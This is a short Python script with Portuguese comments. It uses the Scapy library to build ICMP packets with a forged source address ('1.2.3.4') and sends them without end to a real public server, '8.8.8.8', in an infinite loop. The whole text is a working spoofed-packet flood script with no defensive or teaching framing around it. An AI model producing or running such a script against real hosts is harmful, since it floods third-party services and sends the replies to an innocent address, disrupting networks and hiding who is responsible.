from scapy.all import *

# Endereço IP falso de origem
source_ip = "1.2.3.4"
# Endereço IP de destino real
target_ip = "8.8.8.8"

# Criando um pacote IP/ICMP com o endereço IP de origem falsificado
packet = IP(src=source_ip, dst=target_ip) / ICMP()

# Loop infinito para enviar o pacote
while True:
    send(packet)
